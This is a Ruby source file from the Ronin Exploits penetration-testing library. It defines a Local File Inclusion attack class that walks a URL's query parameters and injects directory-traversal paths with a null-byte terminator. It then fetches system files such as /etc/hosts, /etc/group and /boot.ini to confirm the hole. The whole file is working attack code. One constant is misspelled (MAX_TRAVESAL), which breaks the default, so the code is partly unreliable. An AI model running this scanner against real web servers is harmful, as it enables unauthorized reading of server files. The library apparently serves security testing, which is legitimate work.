#
# Ronin Exploits - A Ruby library for Ronin that provides exploitation and
# payload crafting functionality.
#
# Copyright (c) 2007-2011 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This file is part of Ronin Exploits.
#
# Ronin is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ronin is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ronin.  If not, see <http://www.gnu.org/licenses/>
#

require 'ronin/attacks/web'
require 'ronin/path'

module Ronin
  module Attacks
    #
    # Represents Local File Inclusion (LFI) attacks.
    #
    # @since 1.0.0
    #
    class LFI < Web

      # The minimum number of directories to traverse up
      MIN_TRAVERSAL = 2

      # The maximum number of directories to traverse up
      MAX_TRAVERSAL = 7

      # Known files to try including
      KNOWN_FILES = {
        '/etc/hosts' => /(127\.0\.0\.1|::1)\s+localhost/,
        '/etc/group' => /(root|admin|wheel):(x)?/,
        '/boot.ini'  => '[boot loader]'
      }

      # Number of directories to traverse up
      property :traversal, Integer, :default => MAX_TRAVESAL

      # Whether to terminate the LFI path with a null byte
      property :terminate, Boolean, :default => true

      #
      # Scans the URL for LFI vulnerabilities.
      #
      # @param [URI::HTTP, String] url
      #   The URL to scan.
      #
      # @param [Hash] options
      #   Additional options.
      #
      # @option options [Array, Range] :up (MIN_TRAVESAL..MAX_TRAVERSAL)
      #   The number of directories to attempt traversing up.
      #
      # @return [LFI]
      #   The first discovered LFI vulnerability.
      #   If no block is given, an enumerator object will be returned.
      #
      # @api public
      #
      def self.test(uri,options={})
        uri = URI(uri) unless uri.kind_of?(URI)
        url = URL.from(uri)
        up  = (options.delete(:up) || (MIN_TRAVERSAL..MAX_TRAVERSAL))

        uri.query_params.each do |name,value|
          lfi = new(options.merge(
            :url           => url,
            :query_param   => name,
            :original_data => value
          ))

          up.each do |n|
            lfi.traversal = n

            return lfi if lfi.vulnerable?
          end
        end

        return nil
      end

      #
      # Injects a local path along side the original data of the query param.
      #
      # @param [String] path
      #   The local path to inject.
      #
      # @return [String]
      #   The query param value with the injected path.
      #
      # @api semipublic
      #
      def inject(path)
        full_path = Path.up(self.traversal).join(path.to_s)
        full_path = "#{full_path}\0" if terminate?

        return super(:append => "/../#{full_path}")
      end

      #
      # Tests whether the URL and query parameter are vulnerable to LFI.
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to LFI.
      #
      # @api public
      #
      def vulnerable?(options={})
        KNOWN_FILES.any? do |path,pattern|
          exploit!(path).body.match(pattern)
        end
      end

    end
  end
end
